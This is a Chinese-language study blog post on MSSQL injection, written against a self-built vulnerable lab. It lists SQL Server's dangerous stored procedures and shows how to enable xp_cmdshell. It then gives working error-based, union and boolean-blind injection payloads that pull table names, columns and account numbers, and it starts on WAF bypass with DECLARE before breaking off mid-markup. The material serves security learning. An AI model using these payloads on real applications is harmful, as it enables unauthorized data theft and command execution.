        <content type="html"><![CDATA[<p>来学习一下MSSQL相关的安全知识，不能只学MySQL</p><p>这里找到一位大佬的文章，跟着这个来逐步学习：<a href="https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI">https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI</a></p><h1 id="MSSQL介绍"><a href="#MSSQL介绍" class="headerlink" title="MSSQL介绍"></a>MSSQL介绍</h1><p><strong>简介</strong></p><p>MSSQL也叫Microsoft SQL Server。</p><p>SQL Server是由Microsoft开发和推广的**关系数据库管理系统(DBMS)**；</p><p>SQL Server使用方便，伸缩性好与相关软件集成程度高；</p><p>SQL Server 数据库引擎为关系型数据和结构化数据提供了更安全可靠的存储功能。</p><p><strong>SQL Server各服务作用</strong></p><ul><li>SQL Server(MSSQLSERVER)是必须要开启的，这个是数据库引擎服务，它就像汽车的发动机一样，缺它不可。</li><li>SQL Server代理(MSSQLSERVER)是代理服务，比如你有一些自动运行的，定时作业，或者是一些维护计划，比如定时备份数据库等操作，那么就要打开，否则，就不会备份数据库了。 </li><li>SQL Server Analysis Services (MSSQLSERVER)是分析服务，一般不用开启，除非你做多位分析，和数据挖掘，才需要开启。</li><li>SQL Full-text Filter Daemon Launcher (MSSQLSERVER)是全文检索服务，如果你没有使用全文检索技术，那么也不需要开启。 </li><li>SQL Server VSS Writer MicrosoftSQLServer的SQL编写器服务，允许备份和还原应用程序以便在VolumeShadowCopyService(VSS)框架中进行操作。</li><li>Sql Browser 服务 一般你要进行远程访问，不需要开启sql browser，通过：服务器ip,端口 这种方式就可以访问远程的服务器。</li></ul><p>下面安装MSSQL2008的版本用来学习。</p><h1 id="MSSQL基础知识"><a href="#MSSQL基础知识" class="headerlink" title="MSSQL基础知识"></a>MSSQL基础知识</h1><h2 id="一些默认库"><a href="#一些默认库" class="headerlink" title="一些默认库"></a>一些默认库</h2><ul><li>master   &#x2F;&#x2F;用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。</li><li>model    &#x2F;&#x2F;SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础</li><li>msdb     &#x2F;&#x2F;由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息</li><li>tempdb   &#x2F;&#x2F;它为临时表和其他临时工作提供了一个存储区。</li></ul><blockquote><p>sqlserver使用的两个端口，TCP-1433，UDP-1434</p><p>mssql注入常要打交道的库也就是 master，其中储存了所有数据库名与存储过程。类比于 MySQL 中的 <code>information_schema</code> 元数据库</p><p>权限:2008之前，为system、2008及其以后权限不再为system</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404103930739.png" alt="image-20240404103930739"></p><p>下面命令可以查询所有数据库名：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select name from master.dbo.sysdatabases;<br>select name from master.sys.databases;<br>//sqlserver2005之后sysdatabases变成sys.databases存放在视图中<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404104149872.png" alt="image-20240404104149872"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404104216061.png" alt="image-20240404104216061"></p><p>下列命令用来查询对象名及其类型：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select top 100 name,xtype from sysobjects;//从当前数据库的 sysobjects 系统表中选择前 100 行的 name 和 xtype 列数据<br>//但是在sys.objects中xtype为type<br>select top 100 name,type from sys.objects;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404105226387.png" alt="image-20240404105226387"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404105705167.png" alt="image-20240404105705167"></p><p>下面是一些在 SQL Server 中用于描述对象类型的缩写或标识符。它们通常在系统表中使用，以区分不同种类的数据库对象。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C = CHECK 约束：表示一个表的检查约束，用于确保满足特定条件的数据才能插入到表中。<br>D = 默认值或 DEFAULT 约束：表示对列的默认值约束，用于在插入新行时为列提供默认值。<br>F = FOREIGN KEY 约束：表示外键约束，用于维护表与表之间的引用完整性。<br>L = 日志：表示数据库的事务日志，用于记录数据库的更新操作，以确保事务的持久性和一致性。<br>FN = 标量函数：表示标量函数，它返回单个值。<br>IF = 内嵌表函数：表示内联表值函数，它能返回一个包含多行的结果集。<br>P = 存储过程：表示数据库中的存储过程，包含了可复用的、预编译的 SQL 代码块。<br>PK = PRIMARY KEY 约束（类型是 K）：表示主键约束，用于唯一标识表中的每一行记录。<br>RF = 复制筛选存储过程：这是与 SQL Server 复制功能相关的对象，用于筛选要复制的数据。<br>S = 系统表：表示数据库系统表，用于存储数据库元数据信息的特殊表。<br>TF = 表函数：表示表值函数，它可以返回一个表示为表格的结果集。<br>TR = 触发器：表示数据库中的触发器，用于定义在表上执行的自动化操作。<br>U = 用户表：表示用户创建的表，用于存储实际数据。<br>UQ = UNIQUE 约束（类型是 K）：表示唯一约束，用于确保列或列组合中的值是唯一的。<br>V = 视图：表示数据库中的视图，提供了对一个或多个基本表的结构化访问。<br>X = 扩展存储过程：表示扩展存储过程，这是一种特殊的存储过程类型。<br></code></pre></td></tr></table></figure><p><strong>存储过程</strong></p><blockquote><p>储存过程是一个可编程的函数，它在数据库中创建并保存。它可以有SQL语句和一些特殊的控制结构组成。当希望在不同的应用程序或平台上执行相同的函数，或者封装特定功能时，存储过程是非常有用的。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式。</p><p>可以理解为一个函数调用的过程</p></blockquote><p><strong>常用的危险存储过程及其作用</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">xp_cmdshell：执行操作系统命令的存储过程，可用于在 SQL Server 上运行命令行命令。<br><br>xp_dirtree：在指定目录下列出所有目录及子目录的文件夹结构。<br><br>xp_enumgroups：用于列举系统中的所有用户组。<br><br>xp_fixeddrives：返回计算机上所有磁盘驱动器的信息。<br><br>xp_loginconfig：显示有关 SQL Server 登录的配置信息。<br><br>xp_enumerrorlogs：列出系统错误日志的内容。<br><br>xp_getfiledetails：返回文件的详细信息，如路径、大小、创建日期等。<br><br>Sp_OACreate：用于创建一个新的OLE Automation 对象。<br><br>Sp_OADestroy：释放先前创建的OLE Automation 对象。<br><br>Sp_OAGetErrorInfo：获取关于上一次调用的错误信息。<br><br>Sp_OAGetProperty：获取一个OLE Automation 对象的属性值。<br><br>Sp_OAMethod：调用一个OLE Automation 对象的方法。<br><br>Sp_OASetProperty：设置一个OLE Automation 对象的属性值。<br><br>Sp_OAStop：停止OLE Automation 对象的执行。<br><br>Xp_regaddmultistring：向注册表中指定项添加名称和数据。<br><br>Xp_regdeletekey：删除指定的注册表项及其所有子项。<br><br>Xp_regdeletevalue：删除指定的注册表项中的指定值。<br><br>Xp_regenumvalues：返回指定注册表项的值名称列表。<br><br>Xp_regread：返回指定注册表项的指定值的数据。<br><br>Xp_regremovemultistring：从注册表中指定的项中移除一个或多个多字符串值。<br><br>Xp_regwrite：将数据写入指定的注册表项。<br><br>sp_makewebtask：生成用于在 SQL Server 上导出数据的命令。<br><br>sp_configure:  用于查看和更改服务器配置选项<br></code></pre></td></tr></table></figure><h2 id="一些字符"><a href="#一些字符" class="headerlink" title="一些字符"></a>一些字符</h2><p><strong>注释符</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/**/<br>--<br>;%00 //emm这个我试不出来，不知道是不是在网页得时候才有用，因为%00出来是NULL<br></code></pre></td></tr></table></figure><p><strong>空白符</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404111658741.png" alt="image-20240404111658741"></p><p><strong>特殊一点的运算符</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ALL 如果一组的比较都为true，则比较结果为true<br><br>AND 如果两个布尔表达式都为true，则结果为true；如果其中一个表达式为false，则结果为false<br><br>ANY 如果一组的比较中任何一个为true，则结果为true<br><br>BETWEEN 如果操作数在某个范围之内，那么结果为true<br><br>EXISTS  如果子查询中包含了一些行，那么结果为true<br><br>IN  如果操作数等于表达式列表中的一个，那么结果为true<br><br>LIKE    如果操作数与某种模式相匹配，那么结果为true<br><br>NOT 对任何其他布尔运算符的结果值取反<br><br>OR  如果两个布尔表达式中的任何一个为true，那么结果为true<br><br>SOME    如果在一组比较中，有些比较为true，那么结果为true<br></code></pre></td></tr></table></figure><p><strong>语法定义符号</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt; &gt; 尖括号，用于分隔字符串，字符串为语法元素的名称，SQL语言的非终结符。<br><br><br>::= 定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。 被定义的元素位于操作符的左边，规则定义位于操作符的右边。<br><br><br>[ ] 方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。<br><br><br>&#123; &#125; 花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。<br><br><br>() 括号是分组运算符<br></code></pre></td></tr></table></figure><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ol><li>聚合函数：<ul><li><code>SUM()</code>：计算某列的总和。</li><li><code>COUNT()</code>：计算某列的行数。</li><li><code>AVG()</code>：计算某列的平均值。</li><li><code>MIN()</code>：找到某列的最小值。</li><li><code>MAX()</code>：找到某列的最大值。</li></ul></li><li>字符串函数：<ul><li><code>LEN()</code>：返回字符串的长度。</li><li><code>UPPER()</code>：将字符串转换为大写。</li><li><code>LOWER()</code>：将字符串转换为小写。</li><li><code>SUBSTRING()</code>：提取部分字符串。</li><li><code>CONCAT()</code>：将多个字符串连接在一起。</li><li><code>ASCII()</code>:   将字符转换成对应的ASCII码</li><li>char():   将ASCII转换成对应的字符</li></ul></li><li>日期和时间函数：<ul><li><code>GETDATE()</code>：返回当前日期和时间。</li><li><code>DATEPART()</code>：返回日期或时间部分的值（如年、月、日、小时、分钟等）。</li><li><code>DATEDIFF()</code>：计算两个日期之间的差值。</li><li><code>DATEADD()</code>：在日期上添加或减去指定的时间间隔。</li></ul></li><li>数学函数：<ul><li><code>ABS()</code>：返回数值的绝对值。</li><li><code>ROUND()</code>：将数值四舍五入到指定的小数位数。</li><li><code>FLOOR()</code>：返回不大于指定数值的最大整数。</li><li><code>CEILING()</code>：返回不小于指定数值的最小整数。</li><li><code>POWER()</code>：计算一个数的指定次幂。</li></ul></li><li>逻辑函数：<ul><li><code>IF()</code> 或 <code>IIF()</code>：根据条件返回不同的值。</li><li><code>CASE</code> 表达式：根据条件选择不同的结果。</li></ul></li></ol><p>mssql还有一个特有的函数用来延迟一段时间，mysql则是用sleep</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-- 延迟 5 秒<br>WAITFOR DELAY &#x27;00:00:05&#x27;<br><br>-- 延迟 2.5 秒<br>WAITFOR DELAY &#x27;00:00:02.500&#x27;<br></code></pre></td></tr></table></figure><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><strong>基本信息</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@@version  //数据库版本<br>@@servername //主机名<br>user  //当前数据库用户名<br>db_name()  //当前数据库名<br>;select user  //查询是否支持多语句<br>SUSER_SNAME() //当前会话登录的用户名<br>ORIGINAL_LOGIN()  //返回最初执行当前批处理或触发器的登录名<br>current_user()  //当前数据库用户<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404112105796.png" alt="image-20240404112105796"></p><p><strong>判断是否站库分离</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select * from info where id=&#x27;1&#x27;and host_name()=@@servername;--&#x27;<br>//host_name()表示客户端主机名<br>//@@servername表示服务端主机名<br>//如果为true则表示没有分离，通过比较这两个值，可以确定查询正在运行的数据库服务器是否同时包含应用程序服务器和数据库服务器。<br></code></pre></td></tr></table></figure><p>或者可以通过xp_cmshell来判断，这里先开启xp_cmdshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sp_configure &#x27;show advanced options&#x27;, 1;<br>reconfigure;<br>GO<br>sp_configure &#x27;xp_cmdshell&#x27;, 1;<br>RECONFIGURE;<br>GO<br>xp_cmdshell &quot;whoami&quot;;<br>//或者 exec xp_cmdshell &quot;whoami&quot;;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404122902796.png" alt="image-20240404122902796"></p><blockquote><p>xp_cmdshell是默认关闭的为0，需要先开启它才行</p><p>使用sp_cocnfigure 可以修改服务器配置</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404123145991.png" alt="image-20240404123145991"></p></blockquote><p>我们通过使用xp_cmdshell就可以判断出当前用户的权限，比如MSSQL2005的权限一般是system 而2008是nt authority\network service，在上图中也有显示。</p><p><strong>判断当前是否为mssql</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select * from sysobjects;<br>//因为sysobjects为MSSQL中独有的数据表，返回正常即可表示为MSSQL<br>//sysobjects相当于master.sys.objects<br></code></pre></td></tr></table></figure><p><strong>权限判断</strong></p><p><code>IS_SRVROLEMEMBER(&#39;role&#39; [, &#39;login&#39;])</code> 函数是 SQL Server 中的一个内置函数，用于检查指定登录名（login）是否属于指定的服务器角色（role），不指定用户名就默认当前登录用户名。用来判断服务器角色</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404142324755.png" alt="image-20240404142324755"></p><p>下面是一些固定角色：</p><table><thead><tr><th align="left">服务器级的固定角色</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">sysadmin</td><td align="left">sysadmin 固定服务器角色的成员可以在服务器上执行任何活动。</td></tr><tr><td align="left">serveradmin</td><td align="left">serveradmin 固定服务器角色的成员可以更改服务器范围的配置选项和关闭服务器。</td></tr><tr><td align="left">securityadmin</td><td align="left">securityadmin 固定服务器角色的成员可以管理登录名及其属性。 他们可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 服务器级权限。 他们还可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 数据库级权限（如果他们具有数据库的访问权限）。 此外，他们还可以重置 SQL Server 登录名的密码。 重要说明： 如果能够授予对 数据库引擎 的访问权限和配置用户权限，安全管理员可以分配大多数服务器权限。 securityadmin 角色应视为与 sysadmin 角色等效。</td></tr><tr><td align="left">processadmin</td><td align="left">processadmin 固定服务器角色的成员可以终止在 SQL Server 实例中运行的进程。</td></tr><tr><td align="left">setupadmin</td><td align="left">setupadmin 固定服务器角色的成员可以使用 Transact-SQL 语句添加和删除链接服务器。 （使用 Management Studio 时需要 sysadmin 成员资格。）</td></tr><tr><td align="left">bulkadmin</td><td align="left">bulkadmin 固定服务器角色的成员可以运行 <code>BULK INSERT</code> 语句。</td></tr><tr><td align="left">diskadmin</td><td align="left">diskadmin 固定服务器角色用于管理磁盘文件。</td></tr><tr><td align="left">dbcreator</td><td align="left">dbeator 固务器角色的成员可以创建、更改、删除和还原任何数据库。</td></tr><tr><td align="left">puic</td><td align="left">每个 SQL Server 登录名都属于 public 服务器角色。 如果未向某个服务器主体授予或拒绝对某个安全对象的特定权限，该用户将继承授予该对象的 public 角色的权限。 只有在希望所有用户都能使用对象时，才在对象上分配 Public 权限。 你无法更改具有 Public 角色的成员身份。 注意plic 与其他角色的实现方式不同，可通过 public 固定服务器角色授予、拒绝或调用权限。</td></tr></tbody></table><p>数据库级别角色使用<code>IS_MEMBER(&#39;role&#39;)来判断</code></p><table><thead><tr><th align="left">固定数据库角色名</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">db_owner</td><td align="left">db_owner 固定数据库角色的成员可以执行数据库的所有配置和维护活动，还可以删除 SQL Server中的数据库。 （在 SQL 数据库 和 SQL 数据仓库中，某些维护活动需要服务器级别权限，并且不能由 db_owners执行。）</td></tr><tr><td align="left">db_securityadmin</td><td align="left">db_securityadmin 固定数据库角色的成员可以仅修改自定义角色的角色成员资格、创建无登录名的用户和管理权限。 向此角色中添加主体可能会导致意外的权限升级。</td></tr><tr><td align="left">db_accessadmin</td><td align="left">db_accessadmin 固定数据库角色的成员可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限。</td></tr><tr><td align="left">db_backupoperator</td><td align="left">db_backupoperator 固定数据库角色的成员可以备份数据库。</td></tr><tr><td align="left">db_ddladmin</td><td align="left">db_ddladmin 固定数据库角色的成员可以在数据库中运行任何数据定义语言 (DDL) 命令。</td></tr><tr><td align="left">db_datawriter</td><td align="left">db_datawriter 固定数据库角色的成员可以在所有用户表中添加、删除或更改数据。</td></tr><tr><td align="left">db_datareader</td><td align="left">db_datareader 固定数据库角色的成员可以从所有用户表中读取所有数据。</td></tr><tr><td align="left">db_denydatawriter</td><td align="left">db_denydatawriter 固定数据库角色的成员不能添加、修改或删除数据库内用户表中的任何数据。</td></tr><tr><td align="left">db_denydatareader</td><td align="left">db_denydatareader 固定数据库角色的成员不能读取数据库内用户表中的任何数据。</td></tr></tbody></table><p>返回类型:</p><table><thead><tr><th>返回值</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>login 不是 role 的成员。</td></tr><tr><td>1</td><td>login 是 role 的成员。</td></tr><tr><td>NULL</td><td>role 或 login 无效，或者没有查看角色成员身份的权限。</td></tr></tbody></table><h1 id="MSSQL注入流程"><a href="#MSSQL注入流程" class="headerlink" title="MSSQL注入流程"></a>MSSQL注入流程</h1><p>由于网上没有现成靶场需要自己搭一个测试，参考文章：<a href="https://macchiato.ink/web/web_security/mssql_injection_setup/#0x03-web%E6%9C%8D%E5%8A%A1%E5%AE%89%E8%A3%85">https://macchiato.ink/web/web_security/mssql_injection_setup/#0x03-web%E6%9C%8D%E5%8A%A1%E5%AE%89%E8%A3%85</a></p><blockquote><p>开iis的时候记得要勾选.net扩展不然解析不了</p></blockquote><p>最后搭好大概就是这样</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404151819506.png" alt="image-20240404151819506"></p><p><strong>注入流程</strong></p><ol><li>获取数据库名</li><li>获取数据库的表名</li><li>获取数据库的字段名</li><li>获取对应的数据</li></ol><h2 id="主要系统表"><a href="#主要系统表" class="headerlink" title="主要系统表"></a>主要系统表</h2><ol><li>sysdatabases :这张表保存在master数据库中，里边的name字段下存放的是所有数据库的库名。 </li><li>sysobjects：这张表保存的是数据库的表的信息，里边的id字段存放的是表的id，name为表名，xtype 字段存放的是表的类型，u代表为用户创建的表，s表示该表是系统表。</li><li>syscolumns：这张表存放的是数据库中字段的信息，id 为表的id，该id可以通过sysobjects获得。name为字段名称。</li></ol><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><p><strong>利用db_name()来获取</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select 1,db_name(),NULL,NULL,NULL<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404154924142.png" alt="image-20240404154924142"></p><p>还可以使其报错来获取库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and db_name()&gt;0<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404155032112.png" alt="image-20240404155032112"></p><h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27;)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404160254630.png" alt="image-20240404160254630"></p><h2 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;fsb_messages&#x27;) and name&lt;&gt;&#x27;id&#x27;);--<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240404164654710.png" alt="image-20240404164654710"></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select top 1 message_id,NULL,NULL,NULL,NULL from fsb_messages<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405004846596.png" alt="image-20240405004846596"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select%20 message_id,NULL,NULL,NULL,NULL from fsb_messages<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405004940238.png" alt="image-20240405004940238"></p><blockquote><p>报错注入只能查询一个一个值，但是mssql没有limit这种东西，就只能用top加上判断来遍历数据。</p></blockquote><p>但是这里的message_id和数字类型一样就要换其他类型来进行报错回显，但是试了一下发现不行，应该要是查询的那部分出错才会显示出来</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405005556182.png" alt="image-20240405005556182"></p><p>但是当联合查询可用又知道列数时可以直接像上面一样全部查出，可以利用order by来判断列数。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405005134075.png" alt="image-20240405005134075"></p><p>order by 5不报错证明就有5列数据。</p><h2 id="显式转换报错"><a href="#显式转换报错" class="headerlink" title="显式转换报错"></a>显式转换报错</h2><p>上面的都是隐式转换类型来报错获得信息，mssql中还有两个函数用于显式转换</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">CAST</span>( expression <span class="hljs-keyword">AS</span> data_type )<br><br><span class="hljs-keyword">CONVERT</span>(data_type[(length)], expression [, style])<br><br></code></pre></td></tr></table></figure><p>下面拿一个varchar数据来进行示例</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?user_id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,text) <span class="hljs-keyword">from</span> fsb_messages)<br>?user_id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-built_in">cast</span>(text <span class="hljs-keyword">as</span> <span class="hljs-type">int</span>) <span class="hljs-keyword">from</span> fsb_messages)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405105044697.png" alt="image-20240405105044697"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405105134618.png" alt="image-20240405105134618"></p><h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>联合注入前先使用order by判断列数，上面有提到过。</p><p>查询的时候如果发现数据类型不兼容可以用NULL替换。</p><h2 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union all select NULL,name COLLATE Chinese_PRC_CI_AS,NULL,NULL,NULL from master..sysdatabases<br>//表明还可以这样子写法学到了<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405013223845.png" alt="image-20240405013223845"></p><blockquote><p>这里除了数据类型要一样每个列的排序规则也要一样不然会报错，上面的COLLATE就是用来转换排序规则的，不转换就会报下面的错误</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405013414465.png" alt="image-20240405013414465"></p></blockquote><h2 id="获取数据库表名"><a href="#获取数据库表名" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select NULL,name COLLATE Chinese_PRC_CI_AS,NULL,NULL,NULL from FoundStone_Bank..sysobjects where xtype=&#x27;u&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405013831956.png" alt="image-20240405013831956"></p><h2 id="获取指定表的字段名"><a href="#获取指定表的字段名" class="headerlink" title="获取指定表的字段名"></a>获取指定表的字段名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select NULL,name COLLATE Chinese_PRC_CI_AS,NULL,NULL,NULL from FoundStone_Bank..syscolumns where id=(select id from FoundStone_Bank..sysobjects where name=&#x27;fsb_accounts&#x27;)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405014311541.png" alt="image-20240405014311541"></p><h2 id="获取字段具体的值"><a href="#获取字段具体的值" class="headerlink" title="获取字段具体的值"></a>获取字段具体的值</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select account_no,NULL,NULL,NULL,NULL from fsb_accounts<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405014506811.png" alt="image-20240405014506811"></p><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="判断数据库个数"><a href="#判断数据库个数" class="headerlink" title="判断数据库个数"></a>判断数据库个数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and (select count(*) from master..sysdatabases) &gt; 7<br>?user_id=1 and (select count(*) from master..sysdatabases) &gt; 6<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405103329682.png" alt="image-20240405103329682"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405103353807.png" alt="image-20240405103353807"></p><h2 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and substring(db_name(),1,1)=char(106)<br></code></pre></td></tr></table></figure><p>类似mysql盲注一样，遍历字符的布尔盲注</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405103706224.png" alt="image-20240405103706224"></p><p>其余的查询就不写了，在上面的联合注入中一个字符一个字符遍历即可</p><h1 id="简单的绕过注入"><a href="#简单的绕过注入" class="headerlink" title="简单的绕过注入"></a>简单的绕过注入</h1><p>这里介绍一个<strong>declare</strong>函数，他是mssql声明局部变量的函数，可以用它来绕过waf对一些关键词的拦截。</p><p><strong>一般语法</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DECLARE</span> <span class="hljs-variable">@variable_name</span> [<span class="hljs-keyword">AS</span>] data_type [ <span class="hljs-operator">=</span> initial_value];<br></code></pre></td></tr></table></figure><p>可以给变量赋初始值，也可以不赋值。</p><p><strong>声明多个变量</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DECLARE</span> <span class="hljs-variable">@age</span> <span class="hljs-type">INT</span>, <span class="hljs-variable">@salary</span> <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>, <span class="hljs-number">2</span>), <span class="hljs-variable">@isEmployed</span> BIT; #BIT表示布尔类型<br></code></pre></td></tr></table></figure><p><strong>用法示例</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@test</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@test</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> subject <span class="hljs-keyword">from</span> fsb_messages);<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@test</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> fsb_messages;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405110119279.png" alt="image-20240405110119279"></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@test</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@test</span><span class="hljs-operator">=</span><span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> fsb_messages;<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@test</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> fsb_messages;<br></code></pre></td></tr></table></figure><p><img 